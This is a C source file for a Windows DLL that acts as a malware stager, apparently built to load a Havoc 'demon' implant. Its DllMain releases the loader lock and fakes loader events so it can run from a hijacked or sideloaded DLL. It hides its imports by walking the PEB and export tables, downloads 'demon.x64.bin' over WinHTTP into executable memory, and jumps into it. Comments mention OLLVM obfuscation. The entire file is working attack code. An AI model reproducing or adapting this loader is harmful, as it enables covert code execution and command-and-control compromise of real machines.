#include <windows.h>
#include <winhttp.h>
#ifndef __NTDLL_H__
#ifndef TO_LOWERCASE
#define TO_LOWERCASE(out, c1) \
  (out = (c1 <= 'Z' && c1 >= 'A') ? c1 = (c1 - 'A') + 'a' : c1)
#endif

int work();
typedef struct _UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;
typedef struct _PEB_LDR_DATA {
  ULONG Length;
  BOOLEAN Initialized;
  HANDLE SsHandle;
  LIST_ENTRY InLoadOrderModuleList;
  LIST_ENTRY InMemoryOrderModuleList;
  LIST_ENTRY InInitializationOrderModuleList;
  PVOID EntryInProgress;
} PEB_LDR_DATA, *PPEB_LDR_DATA;
// here we don't want to use any functions imported form extenal modules
typedef struct _LDR_DATA_TABLE_ENTRY {
  LIST_ENTRY InLoadOrderModuleList;
  LIST_ENTRY InMemoryOrderModuleList;
  LIST_ENTRY InInitializationOrderModuleList;
  void* BaseAddress;
  void* EntryPoint;
  ULONG SizeOfImage;
  UNICODE_STRING FullDllName;
  UNICODE_STRING BaseDllName;
  ULONG Flags;
  SHORT LoadCount;
  SHORT TlsIndex;
  HANDLE SectionHandle;
  ULONG CheckSum;
  ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
typedef struct _PEB {
  BOOLEAN InheritedAddressSpace;
  BOOLEAN ReadImageFileExecOptions;
  BOOLEAN BeingDebugged;
  BOOLEAN SpareBool;
  HANDLE Mutant;
  PVOID ImageBaseAddress;
  PPEB_LDR_DATA Ldr;
  // [...] this is a fragment, more elements follow here
} PEB, *PPEB;
#endif  //__NTDLL_H__
LPVOID get_module_by_name(WCHAR* module_name);
LPVOID get_func_by_name(LPVOID module, char* func_name);
PVOID VxMoveMemory(PVOID dest, const PVOID src, SIZE_T len) ;
 VOID SlowFillMemory(LPVOID pvDest, SIZE_T cbBuffer,
                                     BYTE bFill) ;

typedef HMODULE(WINAPI* LoadLibraryWFunction)(LPWSTR lpLibFileName);
typedef HINTERNET(WINAPI* WinHttpOpenFunction)(LPCWSTR pszAgentW,
                                                DWORD dwAccessType,
                                                LPCWSTR pszProxyW,
                                                LPCWSTR pszProxyBypassW,
                                                DWORD dwFlags);
typedef HINTERNET(WINAPI* WinHttpConnectFunction)(HINTERNET hSession,
                                          LPCWSTR pswzServerName,
                                          INTERNET_PORT nServerPort,
                                          DWORD dwReserved);
typedef HINTERNET(WINAPI* WinHttpOpenRequestFunction)(
    HINTERNET hConnect, LPCWSTR pwszVerb, LPCWSTR pwszObjectName,
    LPCWSTR pwszVersion, LPCWSTR pwszReferrer, LPCWSTR* ppwszAcceptTypes,
    DWORD dwFlags);
typedef HINTERNET(WINAPI* WinHttpSendRequestFunction)(
    HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength,
    LPVOID lpOptional, DWORD dwOptionalLength, DWORD dwTotalLength,
    DWORD_PTR dwContext);
typedef BOOL(WINAPI* WinHttpReceiveResponseFunction)(HINTERNET hRequest,
                                                     LPVOID lpReserved);

typedef LPVOID(WINAPI* VirtualAllocFunction)(LPVOID lpAddress, SIZE_T dwSize,
                                             DWORD flAllocationType,
                                             DWORD flProtect);
typedef BOOL(WINAPI* WinHttpQueryDataAvailableFunction)(
    HINTERNET hRequest, LPDWORD lpdwNumberOfBytesAvailable);
typedef BOOL(WINAPI* WinHttpReadDataFunction)(HINTERNET hRequest, LPVOID lpBuffer,
                                      DWORD dwNumberOfBytesToRead,
                                      LPDWORD lpdwNumberOfBytesRead);
typedef BOOL(WINAPI* WinHttpCloseHandleFunction)(HINTERNET hInternet);

typedef NTSTATUS
(WINAPI* RtlLeaveCriticalSection)(
    IN PRTL_CRITICAL_SECTION CriticalSection
    );


const WCHAR kernel32string[] __attribute__((section(".text"))) = L"kernel32.dll";
const WCHAR ntdllstring[] __attribute__((section(".text"))) = L"ntdll.dll";
const char WinHttpOpenstring[] __attribute__((section(".text"))) = "WinHttpOpen";
const char WinHttpConnectstring[] __attribute__((section(".text"))) = "WinHttpConnect";
const char WinHttpOpenRequeststring[] __attribute__((section(".text"))) = "WinHttpOpenRequest";
const char WinHttpSendRequeststring[] __attribute__((section(".text"))) = "WinHttpSendRequest";
const char WinHttpReceiveResponsestring[] __attribute__((section(".text"))) = "WinHttpReceiveResponse";
const char VirtualAllocstring[] __attribute__((section(".text"))) = "VirtualAlloc";
const char WinHttpQueryDataAvailablestring[] __attribute__((section(".text"))) = "WinHttpQueryDataAvailable";
const char WinHttpReadDatastring[] __attribute__((section(".text"))) = "WinHttpReadData";
const char WinHttpCloseHandlestring[] __attribute__((section(".text"))) = "WinHttpCloseHandle";
const WCHAR Winhttpstring[] __attribute__((section(".text"))) = L"Winhttp.dll";
const char LoadLibraryWstring[] __attribute__((section(".text"))) = "LoadLibraryW";
const char RtlLeaveCriticalSectionstring[] __attribute__((section(".text"))) = "RtlLeaveCriticalSection";

const WCHAR method[] __attribute__((section(".text"))) = L"GET";
const WCHAR agent[] __attribute__((section(".text"))) = L"TODO";


const WCHAR target_ip[] __attribute__((section(".text"))) = L"127.0.0.1";
const WCHAR target_file[] __attribute__((section(".text"))) = L"demon.x64.bin";
const int target_port __attribute__((section(".text"))) = 80;

int again = 0;

void ___chkstk_ms(); // ollvm的虚假控制流需要链接这个函数
int work() {
      #ifdef DEBUG
      printf("enter work \n");
    #endif
  void* kr32_base = get_module_by_name(kernel32string);
  void* ntdll_base = get_module_by_name(ntdllstring);
  if (!kr32_base) {
    #ifdef DEBUG
      printf("cant find kr32_base\n");
    #endif
    return 1;
  }
  LoadLibraryWFunction _LoadLibraryW =
      (LoadLibraryWFunction)get_func_by_name(kr32_base, LoadLibraryWstring);
  if(!_LoadLibraryW){
        #ifdef DEBUG
      printf("cant find _LoadLibraryW\n");
    #endif
    return 2;
  }
  void* winhttp_base = _LoadLibraryW(Winhttpstring);
  if(!winhttp_base){
            #ifdef DEBUG
      printf("cant find winhttp_base\n");
    #endif
    return 3;
  }
  WinHttpOpenFunction _WinHttpOpen =
      get_func_by_name(winhttp_base, WinHttpOpenstring);
      if (!_WinHttpOpen){
            #ifdef DEBUG
      printf("cant find _WinHttpOpen\n");
    #endif
        return 4;
      }

  WinHttpConnectFunction _WinHttpConnect =
      get_func_by_name(winhttp_base, WinHttpConnectstring);

      if(!_WinHttpConnect){
                    #ifdef DEBUG
      printf("cant find _WinHttpConnect\n");
    #endif
        return 5;
      }
  WinHttpOpenRequestFunction _WinHttpOpenRequest =
      get_func_by_name(winhttp_base, WinHttpOpenRequeststring);

if(!_WinHttpOpenRequest){
                      #ifdef DEBUG
      printf("cant find _WinHttpOpenRequest\n");
    #endif
  return 6;
}

  WinHttpSendRequestFunction _WinHttpSendRequest =
      get_func_by_name(winhttp_base, WinHttpSendRequeststring);
if(!_WinHttpSendRequest){
                        #ifdef DEBUG
      printf("cant find _WinHttpSendRequest\n");
    #endif
  return 7;
}

  WinHttpReceiveResponseFunction _WinHttpReceiveResponse =
      get_func_by_name(winhttp_base, WinHttpReceiveResponsestring);
  if (!_WinHttpReceiveResponse){
                            #ifdef DEBUG
      printf("cant find _WinHttpReceiveResponse\n");
    #endif
    return 8;
  }


  VirtualAllocFunction _VirtualAlloc =
      get_func_by_name(kr32_base, VirtualAllocstring);

if(!_VirtualAlloc){
                       #ifdef DEBUG
      printf("cant find _VirtualAlloc\n");
    #endif
  return 9;
}
  WinHttpQueryDataAvailableFunction _WinHttpQueryDataAvailable =
      get_func_by_name(winhttp_base, WinHttpQueryDataAvailablestring);

if(!_WinHttpQueryDataAvailable){
                         #ifdef DEBUG
      printf("cant find _WinHttpQueryDataAvailable\n");
    #endif
  return 10;
}
  WinHttpReadDataFunction _WinHttpReadData =
      get_func_by_name(winhttp_base, WinHttpReadDatastring);

if(!_WinHttpReadData){
                           #ifdef DEBUG
      printf("cant find _WinHttpReadData\n");
    #endif
return 11;
}
  WinHttpCloseHandleFunction _WinHttpCloseHandle =
      get_func_by_name(winhttp_base, WinHttpCloseHandlestring);

if (!_WinHttpCloseHandle){
                          #ifdef DEBUG
      printf("cant find _WinHttpCloseHandle\n");
    #endif
  return 12;

}

  // https://github.com/huaigu4ng/SysWhispers3WinHttp/blob/main/SysWhispers3WinHttp.c
  DWORD dwSize = 0;
  DWORD dwDownloaded = 0;
  LPSTR pszOutBuffer;
  BOOL bResults = FALSE;
  HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;

  hSession =
      _WinHttpOpen(agent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                   WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

  // payload所在的服务器, ip 和 端口
  if (hSession) hConnect = _WinHttpConnect(hSession, target_ip, target_port, 0);
  else {
                        #ifdef DEBUG
      printf("_WinHttpConnect FAIL\n");
    #endif
    return 15;
  }

  if (hConnect)// payload文件名
    hRequest = _WinHttpOpenRequest(hConnect, method, target_file,
                                   NULL, WINHTTP_NO_REFERER,
                                   WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
  else{
                  #ifdef DEBUG
      printf("_WinHttpOpenRequest FAIL\n");
    #endif
    return 16;
  }

  if (hRequest)
    bResults = _WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                   WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
        else {

                            #ifdef DEBUG
      printf("_WinHttpSendRequest FAIL\n");
    #endif
    return 17;
        }

  if (bResults) bResults = _WinHttpReceiveResponse(hRequest, NULL);
  else{
                         #ifdef DEBUG
      printf("_WinHttpReceiveResponse FAIL ,Last Error %d\n",GetLastError());
    #endif
    return 13;
  }

  PVOID lpAddress = NULL;
  SIZE_T sDataSize = 0x1000 * 10000;  // 1000K
  lpAddress = _VirtualAlloc(0, sDataSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  if (!lpAddress){
    #ifdef DEBUG
      printf("cant alloc memory\n");
    #endif
  }
  DWORD_PTR hptr = (DWORD_PTR)lpAddress;

  if (bResults) do {
      dwSize = 0;
      _WinHttpQueryDataAvailable(hRequest, &dwSize);
      printf("dwSize %d \n",dwSize);
      pszOutBuffer =
          _VirtualAlloc(0, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
      if (!pszOutBuffer){
        printf("pszOutBuffer %d \n",pszOutBuffer);
        break;
      }
      if (dwSize) {
        //SlowFillMemory(pszOutBuffer, dwSize + 1, 0);
        SlowFillMemory(pszOutBuffer, dwSize, 0);
      }
      _WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded);
      VxMoveMemory((PVOID)hptr, pszOutBuffer, dwSize);
      hptr += dwSize;
    } while (dwSize > 0);

  if (hRequest) _WinHttpCloseHandle(hRequest);
  if (hConnect) _WinHttpCloseHandle(hConnect);
  if (hSession) _WinHttpCloseHandle(hSession);
  void (*t)(void) = lpAddress;
   #ifdef DEBUG
      char * dump = lpAddress;
      printf("%x %x %x \n",dump[0],dump[1],dump[2]);
    #endif
  t();

  return 0;
}

LPVOID get_module_by_name(WCHAR* module_name) {
  PPEB peb = NULL;
#if defined(_WIN64)
  peb = (PPEB)__readgsqword(0x60);
#else
  peb = (PPEB)__readfsdword(0x30);
#endif
  PPEB_LDR_DATA ldr = peb->Ldr;
  LIST_ENTRY list = ldr->InLoadOrderModuleList;
  PLDR_DATA_TABLE_ENTRY Flink = *((PLDR_DATA_TABLE_ENTRY*)(&list));
  PLDR_DATA_TABLE_ENTRY curr_module = Flink;
  while (curr_module != NULL && curr_module->BaseAddress != NULL) {
    if (curr_module->BaseDllName.Buffer == NULL) continue;
    WCHAR* curr_name = curr_module->BaseDllName.Buffer;
    size_t i = 0;
    for (i = 0; module_name[i] != 0 && curr_name[i] != 0; i++) {
      WCHAR c1, c2;
      TO_LOWERCASE(c1, module_name[i]);
      TO_LOWERCASE(c2, curr_name[i]);
      if (c1 != c2) break;
    }
    if (module_name[i] == 0 && curr_name[i] == 0) {
      // found
      return curr_module->BaseAddress;
    }
    // not found, try next:
    curr_module =
        (PLDR_DATA_TABLE_ENTRY)curr_module->InLoadOrderModuleList.Flink;
  }
  return NULL;
}

LPVOID get_func_by_name(LPVOID module, char* func_name) {
  IMAGE_DOS_HEADER* idh = (IMAGE_DOS_HEADER*)module;
  if (idh->e_magic != IMAGE_DOS_SIGNATURE) {
    return NULL;
  }
  IMAGE_NT_HEADERS* nt_headers =
      (IMAGE_NT_HEADERS*)((BYTE*)module + idh->e_lfanew);
  IMAGE_DATA_DIRECTORY* exportsDir =
      &(nt_headers ->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
  if (exportsDir->VirtualAddress == NULL) {
    return NULL;
  }
  DWORD expAddr = exportsDir->VirtualAddress;
  IMAGE_EXPORT_DIRECTORY* exp =
      (IMAGE_EXPORT_DIRECTORY*)(expAddr + (ULONG_PTR)module);
  SIZE_T namesCount = exp->NumberOfNames;
  DWORD funcsListRVA = exp->AddressOfFunctions;
  DWORD funcNamesListRVA = exp->AddressOfNames;
  DWORD namesOrdsListRVA = exp->AddressOfNameOrdinals;
  // go through names:
  for (SIZE_T i = 0; i < namesCount; i++) {
    DWORD* nameRVA =
        (DWORD*)(funcNamesListRVA + (BYTE*)module + i * sizeof(DWORD));
    WORD* nameIndex =
        (WORD*)(namesOrdsListRVA + (BYTE*)module + i * sizeof(WORD));
    DWORD* funcRVA =
        (DWORD*)(funcsListRVA + (BYTE*)module + (*nameIndex) * sizeof(DWORD));
    LPSTR curr_name = (LPSTR)(*nameRVA + (BYTE*)module);
    size_t k = 0;
    for (k = 0; func_name[k] != 0 && curr_name[k] != 0; k++) {
      if (func_name[k] != curr_name[k]) break;
    }
    if (func_name[k] == 0 && curr_name[k] == 0) {
      // found
      return (BYTE*)module + (*funcRVA);
    }
  }
  return NULL;
}

PVOID VxMoveMemory(PVOID dest, const PVOID src, SIZE_T len) {
  char* d = (char*)(dest);
  char* s = (char*)(src);
  if (d < s)
    while (len--) *d++ = *s++;
  else {
    char* lasts = s + (len - 1);
    char* lastd = d + (len - 1);
    while (len--) *lastd-- = *lasts--;
  }
  return dest;
}
 VOID SlowFillMemory(LPVOID pvDest, SIZE_T cbBuffer,
                                     BYTE bFill) {
  PSIZE_T pdwBuffer;
  LPBYTE pbBuffer;
  SIZE_T dwFill;
  UINT i;

  for (i = 0, dwFill = bFill; i < sizeof(SIZE_T) - 1; i++) {
    dwFill <<= 8;
    dwFill |= bFill;
  }

  pdwBuffer = (PSIZE_T)pvDest;

  while (cbBuffer >= sizeof(*pdwBuffer)) {
    *pdwBuffer++ = dwFill;
    cbBuffer -= sizeof(*pdwBuffer);
  }

  pbBuffer = (LPBYTE)pdwBuffer;

  while (cbBuffer) {
    *pbBuffer++ = bFill;
    cbBuffer--;
  }
}

void ___chkstk_ms(){
  return;
}

#define LdrpInitCompleteEvent (HANDLE)0x4
#define LdrpLoadCompleteEvent (HANDLE)0x3c
#define LdrpWorkCompleteEvent (HANDLE)0x40
PULONG64 getLdrpWorkInProgressAddress() {
    // Find and return address of ntdll!LdrpWorkInProgres
void* ntdll_base = get_module_by_name(ntdllstring);
      void* _RtlExitUserProcess = get_func_by_name(ntdll_base,"RtlExitUserProcess");
    PBYTE rtlExitUserProcessAddressSearchCounter = _RtlExitUserProcess;

    // call 0x41424344 (absolute for 32-bit program; relative for 64-bit program)
    const BYTE callAddressOpcode = 0xe8;
    const BYTE callAddressInstructionSize = sizeof(callAddressOpcode) + sizeof(INT32);

    // Search for this pattern:
    // 00007ffc`949ed9a3 e84c0f0000           call    ntdll!LdrpDrainWorkQueue(7ffc949ee8f4)
    // 00007ffc`949ed9a8 e8070dfeff           call    ntdll!LdrpAcquireLoaderLock(7ffc949ce6b4)
    while (TRUE) {
        if (*rtlExitUserProcessAddressSearchCounter == callAddressOpcode) {
            // If there is another call opcode directly below this one
            if (*(rtlExitUserProcessAddressSearchCounter + callAddressInstructionSize) == callAddressOpcode)
                break;
        }

        rtlExitUserProcessAddressSearchCounter++;
    }

    INT32 rel32EncodedAddress = *(PINT32)(rtlExitUserProcessAddressSearchCounter + sizeof(callAddressOpcode));
    PBYTE ldrpDrainWorkQueue = (PBYTE)(rtlExitUserProcessAddressSearchCounter + callAddressInstructionSize + rel32EncodedAddress);
    PBYTE ldrpDrainWorkQueueAddressSearchCounter = ldrpDrainWorkQueue;

    // mov dword ptr [0x41424344], 0x1
    // Swapped from 0xc705 to be in little endian
    const USHORT movDwordAddressValueOpcode = 0x05c7;
    const BYTE movDwordAddressValueInstructionSize = sizeof(movDwordAddressValueOpcode) + sizeof(INT32) + sizeof(INT32);

    // Search for this pattern:
    // 00007ffc`949ee97f c7055fca100001000000 mov     dword ptr [ntdll!LdrpWorkInProgress (7ffc94afb3e8)], 1
    while (TRUE) {
        if (*(PUSHORT)ldrpDrainWorkQueueAddressSearchCounter == movDwordAddressValueOpcode) {
            // If TRUE (1) is being moved into this address
            if (*(PBOOL)(ldrpDrainWorkQueueAddressSearchCounter + movDwordAddressValueInstructionSize - sizeof(INT32)) == TRUE)
                break;
        }

        ldrpDrainWorkQueueAddressSearchCounter++;
    }

    // Get pointer to ntdll!LdrpWorkInProgress boolean in the .DATA section of NTDLL
    rel32EncodedAddress = *(PINT32)(ldrpDrainWorkQueueAddressSearchCounter + sizeof(movDwordAddressValueOpcode));
    PULONG64 LdrpWorkInProgress = (PULONG64)(ldrpDrainWorkQueueAddressSearchCounter + movDwordAddressValueInstructionSize + rel32EncodedAddress);

    return LdrpWorkInProgress;
}
VOID modifyLdrEvents(BOOL doSet, const HANDLE events[], const SIZE_T eventsSize) {
    // Set event handles used by Windows loader (they are always these handle IDs)
    // This is so we don't hang on WaitForSingleObject in the new thread (launched by ShellExecute) when it's loading more libraries
    // Check the state of these event handles in WinDbg with this command: !handle 0 8 Event

    // Signal and unsignal in reverse order to avoid ordering inversion issues
    if (!doSet) {
        for (SIZE_T i = 0; i < eventsSize; ++i)
            ResetEvent(events[i]);
    }
    else {
        for (SIZE_T i = eventsSize; i-- > 0;)
            SetEvent(events[i]);
    }
}

BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,  // handle to DLL module
    DWORD fdwReason,     // reason for calling function
    LPVOID lpvReserved )  // reserved
{
  DisableThreadLibraryCalls(hinstDLL);
  if (fdwReason == DLL_PROCESS_ATTACH){
    if(again > 0)
      return 1;
    
    again++;

    char* peb = NULL;
    peb = (char*)__readgsqword(0x60);
    #ifdef DEBUG
    printf("Peb address %p\n",peb);
    #endif
      void* ntdll_base = get_module_by_name(ntdllstring);
      RtlLeaveCriticalSection _RtlLeaveCriticalSection = get_func_by_name(ntdll_base,RtlLeaveCriticalSectionstring);
if(!_RtlLeaveCriticalSection){
                          #ifdef DEBUG
      printf("cant find _RtlLeaveCriticalSection\n");
    #endif
  return 19;
}
  PRTL_CRITICAL_SECTION s = *(PRTL_CRITICAL_SECTION*)(peb+0x110);
      #ifdef DEBUG
      printf("LockCount %d RecursionCount %d OwningThread %d LockSemaphore %d SpinCount %d\n",
      s->LockCount,s->RecursionCount,s->OwningThread,s->LockSemaphore,s->SpinCount
      );
    #endif
    //s->LockCount+=1;
    _RtlLeaveCriticalSection(s);
          #ifdef DEBUG
      printf("LockCount %d RecursionCount %d OwningThread %d LockSemaphore %d SpinCount %d\n",
      s->LockCount,s->RecursionCount,s->OwningThread,s->LockSemaphore,s->SpinCount
      );
    #endif
// win10 or later
    const HANDLE events[] = { LdrpInitCompleteEvent, LdrpWorkCompleteEvent };
    const SIZE_T eventsCount = sizeof(events) / sizeof(events[0]);


modifyLdrEvents(TRUE, events, eventsCount);


const PULONG64 LdrpWorkInProgress = getLdrpWorkInProgressAddress();
InterlockedDecrement64(LdrpWorkInProgress);
//






    DWORD idthread;
    HANDLE hThread = CreateThread(0,0,work,0,0,&idthread);
              #ifdef DEBUG
              printf("thread id %x\n",idthread);
                  #endif
    WaitForSingleObject( hThread, INFINITE );
  return 1;
}
}